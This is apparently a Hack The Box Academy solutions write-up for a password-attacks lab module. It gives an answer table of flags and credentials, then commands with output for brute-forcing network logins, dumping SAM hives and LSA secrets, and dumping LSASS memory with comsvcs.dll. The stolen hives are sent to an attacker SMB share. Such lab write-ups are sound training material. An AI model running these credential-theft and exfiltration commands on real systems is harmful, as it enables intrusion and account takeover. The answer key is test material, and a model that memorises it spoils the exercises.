| Section | Question Number | Answer |
| --- | --- | --- |
| Network Services | Question 1 | HTB{That5Novemb3r} |
| Network Services | Question 2 | HTB{Let5R0ck1t} |
| Network Services | Question 3 | HTB{R3m0t3DeskIsw4yT00easy} |
| Network Services | Question 4 | HTB{S4ndM4ndB33} |
| Password Mutations | Question 1 | HTB{P455\_Mu7ations} |
| Password Reuse / Default Passwords | Question 1 | superdba:admin |
| Attacking SAM | Question 1 | hklm\\sam |
| Attacking SAM | Question 2 | matrix |
| Attacking SAM | Question 3 | frontdesk:Password123 |
| Attacking LSASS | Question 1 | lsass.exe |
| Attacking LSASS | Question 2 | Mic@123 |
| Attacking Active Directory & NTDS.dit | Question 1 | ntds.dit |
| Attacking Active Directory & NTDS.dit | Question 2 | 64f12cddaa88057e06a81b54e73b949b |
| Attacking Active Directory & NTDS.dit | Question 3 | jmarston:P@ssword! |
| Attacking Active Directory & NTDS.dit | Question 4 | Winter2008 |
| Credential Hunting in Windows | Question 1 | WellConnected123 |
| Credential Hunting in Windows | Question 2 | 3z1ePfGbjWPsTfCsZfjy |
| Credential Hunting in Windows | Question 3 | ubuntu:FSadmin123 |
| Credential Hunting in Windows | Question 4 | Inlanefreightisgreat2022 |
| Credential Hunting in Windows | Question 5 | edgeadmin:Edge@dmin123! |
| Credential Hunting in Linux | Question 1 | TUqr7QfLTLhruhVbCP |
| Passwd, Shadow & Opasswd | Question 1 | J0rd@n5 |
| Pass the Hash (PtH) | Question 1 | G3t\_4CCE$$\_V1@\_PTH |
| Pass the Hash (PtH) | Question 2 | DisableRestrictedAdmin |
| Pass the Hash (PtH) | Question 3 | c39f2beb3d2ec06a62cb887fb391dee0 |
| Pass the Hash (PtH) | Question 4 | D3V1d\_Fl5g\_is\_Her3 |
| Pass the Hash (PtH) | Question 5 | JuL1()\_SH@re\_fl@g |
| Pass the Hash (PtH) | Question 6 | JuL1()\_N3w\_fl@g |
| Pass the Ticket (PtT) from Windows | Question 1 | 3 |
| Pass the Ticket (PtT) from Windows | Question 2 | Learn1ng\_M0r3\_Tr1cks\_with\_J0hn |
| Pass the Ticket (PtT) from Windows | Question 3 | P4$$\_th3\_Tick3T\_PSR |
| Pass the Ticket (PtT) from Linux | Question 1 | Gett1ng\_Acc3$$\_to\_LINUX01 |
| Pass the Ticket (PtT) from Linux | Question 2 | Linux Admins |
| Pass the Ticket (PtT) from Linux | Question 3 | carlos.keytab |
| Pass the Ticket (PtT) from Linux | Question 4 | C@rl0s\_1$\_H3r3 |
| Pass the Ticket (PtT) from Linux | Question 5 | Mor3\_4cce$$\_m0r3\_Pr1v$ |
| Pass the Ticket (PtT) from Linux | Question 6 | Ro0t\_Pwn\_K3yT4b |
| Pass the Ticket (PtT) from Linux | Question 7 | JuL1()\_SH@re\_fl@g |
| Pass the Ticket (PtT) from Linux | Question 8 | Us1nG\_KeyTab\_Like\_@\_PRO |
| Protected Files | Question 1 | L0veme |
| Protected Archives | Question 1 | HTB{ocnc7r4io8ucsj8eujcm} |
| Password Attacks Lab - Easy | Question 1 | dgb6fzm0ynk@AME9pqu |
| Password Attacks Lab - Medium | Question 1 | HTB{PeopleReuse\_PWsEverywhere!} |
| Password Attacks Lab - Hard | Question 1 | HTB{PWcr4ck1ngokokok} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Network Services

## Question 1

### "Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer."

Students need to use `crackmapexec` to bruteforce the username and password, using the wordlists `username.list` and `password.list` that can be obtained from [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip). To use `crackmapexec`, students must first become the `root` user:

Code: shell

```shell
sudo su
```

```
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo su
┌─[root@pwnbox-base]─[/home/htb-ac413848]
└──╼ #
```

Afterward, `crackmapexec` will be available for use:

Code: shell

```shell
crackmapexec winrm STMIP -u user.list -p password.list
```

```
┌─[root@htb-ktnlhreky8]─[/home/htb-ac330204/Password-Attacks]
└──╼ #cme winrm 10.129.202.136 -u username.list -p password.list

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated "class": algorithms.Blowfish,
SMB         10.129.202.136  5985   NONE             [*] None (name:10.129.202.136) (domain:None)
HTTP        10.129.202.136  5985   NONE             [*] http://10.129.202.136:5985/wsman
WINRM       10.129.202.136  5985   NONE             [-] None\admin:123456
WINRM       10.129.202.136  5985   NONE             [-] None\admin:12345
WINRM       10.129.202.136  5985   NONE             [-] None\admin:123456789

<SNIP>

WINRM       10.129.202.136  5985   NONE             [-] None\john:batman
WINRM       10.129.202.136  5985   NONE             [-] None\john:password
WINRM       10.129.202.136  5985   NONE             [-] None\john:iloveyou
WINRM       10.129.202.136  5985   NONE             [-] None\john:princess
WINRM       10.129.202.136  5985   NONE             [+] None\john:november (Pwn3d!)
```

Having cracked the password for the `john` user, students need to use the credentials `john:november` to authenticate with `evil-winrm`:

Code: shell

```shell
evil-winrm -i STMIP -u john
```

```
┌─[root@htb-ktnlhreky8]─[/home/htb-ac330204/Password-Attacks]
└──╼ #evil-winrm -i 10.129.202.136 -u john

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\john\Documents> 
```

Students then need to read the flag file located at `C:\Users\john\Desktop\flag.txt`:

Code: shell

```shell
type C:\Users\john\Desktop\flag.txt
```

```
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\flag.txt

HTB{That5Novemb3r}
```

Answer: `HTB{That5Novemb3r}`

# Network Services

## Question 2

### "Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer."

Students need to utilize `Hydra` and attack the `SSH` service using using the wordlists `username.list` and `password.list` that can be obtained from the [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip):

Code: shell

```shell
hydra -L username.list -P password.list ssh://STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ hydra -L username.list -P password.list ssh://10.129.202.136

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-07 22:12:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
[DATA] attacking ssh://10.129.202.136:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 20936 to do in 01:57h, 16 active
[STATUS] 194.00 tries/min, 582 tries in 00:03h, 20534 to do in 01:46h, 16 active
[STATUS] 186.86 tries/min, 1308 tries in 00:07h, 19808 to do in 01:47h, 16 active
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
```

Afterward, students need to connect via `SSH` using the credentials `dennis:rockstar`:

Code: shell

```shell
ssh dennis@STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ ssh dennis@10.129.202.136

The authenticity of host '10.129.202.136 (10.129.202.136)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.136' (ECDSA) to the list of known hosts.
dennis@10.129.202.136's password: 

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved. 

dennis@WINSRV C:\Users\dennis>
```

Finally, students need to read the flag file, which is located at `C:\Users\dennis\Desktop\flag.txt`:

Code: cmd

```cmd
type \Desktop\flag.txt
```

```
dennis@WINSRV C:\Users\dennis>type \Desktop\flag.txt

HTB{Let5R0ck1t}
```

Answer: `HTB{Let5R0ck1t}`

# Network Services

## Question 3

### "Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer"

Students need to use `Hydra` to attack the `Remote Desktop Protocol`, using the wordlists `username.list` and `password.list` that can be obtained from the [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip):

Code: shell

```shell
hydra -L username.list -P password.list rdp://STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ hydra -L username.list -P password.list rdp://10.129.202.136

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-07 22:30:01
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task
[DATA] attacking rdp://10.129.202.136:3389/
[STATUS] 388.00 tries/min, 388 tries in 00:01h, 20724 to do in 00:54h, 4 active
[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.
[3389][rdp] host: 10.129.202.136   login: chris   password: 789456123
```

Afterward, students need to authenticate with the found credentials `chris:789456123` using `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /u:chris /p:789456123
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ xfreerdp /v:10.129.202.136 /u:chris /p:789456123

[22:43:57:190] [60567:60568] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[22:43:57:190] [60567:60568] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[22:43:57:190] [60567:60568] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[22:43:57:190] [60567:60568] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[22:43:57:522] [60567:60568] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
<SNIP>
```

At last, students can use the `Remote Desktop` session to read the `flag.txt` file located on the Desktop directory:

![[HTB Solutions/CPTS/z. images/06182fa7d21bf0301f9d55c769927823_MD5.jpg]]

Answer: `HTB{R3m0t3DeskIsw4yT00easy}`

# Network Services

## Question 4

### "Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer."

First, students need to use the `smb_login` module from `Metasploit` to bruteforce the username and password of the SMB service and set its options accordingly, most importantly using `password.list` and `username.list` for `PASS_FILE` and `USER_FILE`, respectively:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
run
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set PASS_FILE password.list
PASS_FILE => password.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set USER_FILE username.list
USER_FILE => username.list
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set RHOST 10.129.202.136
RHOST => 10.129.202.136
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> run

[*] 10.129.202.136:445    - 10.129.202.136:445 - Starting SMB login bruteforce
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:123456',
[!] 10.129.202.136:445    - No active DB -- Credential data will not be saved!
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:12345',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:123456789',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:batman',

<SNIP>

[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\cassie:nicole',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\cassie:daniel',
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\cassie:12345678910'
```

After running the module, students will find the credentials `cassie:12345678910`, subsequently, they need to use `smbclient` to enumerate `SMB` on the spawned target machine:

Code: shell

```shell
smbclient -U cassie -L '\\STMIP\'
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ smbclient -U cassie -L '\\10.129.202.136\'

Enter WORKGROUP\cassie's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CASSIE          Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Subsequently, students need to connect to the share `CASSIE` and `get` the file `flag.txt`:

Code: shell

```shell
smbclient -U cassie '\\STMIP\CASSIE'
get flag.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ smbclient -U cassie '\\10.129.202.136\CASSIE'

Enter WORKGROUP\cassie's password: 
Try "help" to get a list of possible commands.
smb: \> get flag.txt

getting file \flag.txt of size 16 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

At last, after disconnecting from the share, students can read the flag file using `cat`:

Code: shell

```shell
cat flag.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-ktnlhreky8]─[~/Password-Attacks]
└──╼ [★]$ cat flag.txt

HTB{S4ndM4ndB33}
```

Answer: `HTB{S4ndM4ndB33}`

# Password Mutations

## Question 1

### "Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer."

First, students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Subsequently, students need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

Then, students need to bruteforce the password of the `sam` user. Due to the `Diffie-Hellman Key Exchange`, bruteforcing of `SSH` is considerably slower than other services, therefore, students can instead target `FTP`:

Code: shell

```shell
hydra -l sam -P mut_password.list ftp://STMIP -t 64
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ hydra -l sam -P mut_password.list ftp://10.129.202.64 -t 64

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-10 15:39:32
[DATA] max 64 tasks per 1 server, overall 64 tasks, 94044 login tries (l:1/p:94044), ~1470 tries per task
[DATA] attacking ftp://10.129.202.64:21/
[STATUS] 1509.00 tries/min, 1509 tries in 00:01h, 92664 to do in 01:02h, 64 active
[STATUS] 1386.00 tries/min, 4158 tries in 00:03h, 90015 to do in 01:05h, 64 active
[STATUS] 1338.29 tries/min, 9368 tries in 00:07h, 84805 to do in 01:04h, 64 active
[21][ftp] host: 10.129.202.64   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
```

After bruteforcing the password, students can now use the credentials `sam:B@tm@n2022!` to connect to the spawned target machine with `SSH`:

Code: shell

```shell
ssh sam@STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ ssh sam@10.129.202.64

The authenticity of host '10.129.202.64 (10.129.202.64)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.64' (ECDSA) to the list of known hosts.
sam@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

<SNIP>

sam@nix01:~$
```

At last, students can read the flag file "flag.txt":

Code: shell

```shell
cat ~/smb/flag.txt
```

```
sam@nix01:~$ cat ~/smb/flag.txt

HTB{P455_Mu7ations}
```

Answer: `HTB{P455_Mu7ations}`

# Password Reuse / Default Passwords

## Question 1

### "Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit then credentials as the answer. (Format: <username>:<password>)"

Students need to utilize a search engine to search for the default `MySQL` credentials, finding the following [GitHub repo](https://github.com/ihebski/DefaultCreds-cheat-sheet):

![[HTB Solutions/CPTS/z. images/6117d39244f1ca1967b535c0ee2dcc1d_MD5.jpg]]

The `MySQL` credentials `superdba:admin` are prevalent, thus, students need to utilize them. But first, students need to use the previously attained credentials `sam:B@tm@n2022!` to connect to the spawned target machine with `SSH`:

Code: shell

```shell
ssh sam@STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ ssh sam@10.129.202.64

sam@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

<SNIP>

sam@nix01:~$
```

Subsequently, students need to use the `sam:B@tm@n2022!` credentials to connect to `MySQL`:

Code: shell

```shell
mysql -u superdba -padmin
```

```
sam@nix01:~$ mysql -u superdba -padmin

mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Answer: `superdba:admin`

# Attacking SAM

## Question 1

### "Where is the SAM database located in Windows registry? (Format: \*\*\*\*\\\*\*\*\*)"

Students can find the solution `hklm\sam` by reading the module's section:

![[HTB Solutions/CPTS/z. images/6b4366f3fb630b6b0acae4515fac8d15_MD5.jpg]]

Answer: `hklm\sam`

# Attacking SAM

## Question 2

### "Apply the concepts taught in the section to obtain the password to the ITbackdoor user account on the target. Submit the account's clear-text password as the answer."

Students first need to connect to the spawned target using `xfreerdp`:

Code: shell

```shell
xfreerdp /v: STMIP /u:bob /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ xfreerdp /v:10.129.202.137 /u:Bob /p:HTB_@cademy_stdnt! /dynamic-resolution

[16:02:47:656] [22704:22705] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:02:47:656] [22704:22705] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:02:47:656] [22704:22705] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Afterward, students need to open the Command prompt as administrator and create copies of the `registry hives`:

Code: cmd

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe hklm\security C:\security.save
```

```
Microsoft Windows [Version 10.0.18363.1977]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Subsequently, students need to start an `SMB` share from Pwnbox/`PMVPN`:

Code: shell

```shell
sudo smbserver.py share . -smb2support
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ sudo smbserver.py share . -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Students then need to go back to Command Prompt and move over the copies of the `registry hives` over to the `SMB` share:

Code: cmd

```cmd
move sam.save \\PWNIP\share
move security.save \\PWNIP\share
move system.save \\PWNIP\share
```

```
C:\Windows\system32>move C:\sam.save \\10.10.14.249\share
	1 file(s) moved.

C:\Windows\system32>move C:\security.save \\10.10.14.249\share
	1 file(s) moved.

C:\Windows\system32>move C:\system.save \\10.10.14.249\share
	1 file(s) moved.
```

Subsequently, students need to run `secretsdump.py` locally against the `registry hives`:

Code: shell

```shell
secretsdump.py -sam sam.save -security security.save -system system.save local
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ secretsdump.py -sam sam.save -security security.save -system system.save local

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
<SNIP>
```

Then, students need to save the hashes into a file, and crack them with `Hashcat`, utilizing hashmode 1000:

Code: shell

```shell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

a3ecf31e65208382e23b3420a34208fc:mommy1          
c02478537b9727d391bc80011c2e2321:matrix          
31d6cfe0d16ae931b73c59d7e0c089c0:                
58a478135a93ac3bf058a5ea0e8fdb71:Password123     
Approaching final keyspace - workload adjusted. 
```

After cracking the hashes, students will know that the password of `ITbackdoor` is `matrix`.

Answer: `matrix`

# Attacking SAM

## Question 3

### "Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)"

Students can dump the `LSA` secrets using `crackmapexec` with the credentials `Bob:HTB_@cademy_stdnt!`:

Code: shell

```shell
sudo cme smb STMIP --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ sudo cme smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /root/.cme/logs/FRONTDESK01_10.129.202.137_2022-10-10_162159.secrets and /root/.cme/logs/FRONTDESK01_10.129.202.137_2022-10-10_162159.cached
```

From the output of `cme`, students will find out that the credentials are `frontdesk:Password123`.

Answer: `frontdesk:Password123`

# Attacking LSASS

## Question 1

### "What is the name of the executable file associated with the Local Security Authority Process?"

Students can find out the answer `lsass.exe` by reading the module's section:

![[HTB Solutions/CPTS/z. images/04974b8eb461fea81e50fa8b800e935c_MD5.jpg]]

Answer: `lsass.exe`

# Attacking LSASS

## Question 2

### "Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case-Sensitive)"

Students first need to connect to the spawned target using `xfreerdp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:37:05:527] [24159:24160] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:37:05:527] [24159:24160] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:37:05:527] [24159:24160] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
```

Then, students need to open PowerShell as administrator and find the Process ID of `lsass`:

Code: powershell

```powershell
Get-Process lsass
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1142      24     6136      15256       0.84    720   0 lsass
```

Subsequently, students need to create a process memory `dump` file with the following command (adjusting the process id accordingly):

Code: powershell

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 720 C:\lsass.dmp full
```

```
PS C:\Windows\system32> rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 720 C:\lsass.dmp full
```

Thereafter, students will need to use `smbserver.py` from Pwnbox/`PMVPN` to prepare for data exfiltration:

Code: shell

```shell
sudo smbserver.py share . -smb2support
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ sudo smbserver.py share . -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
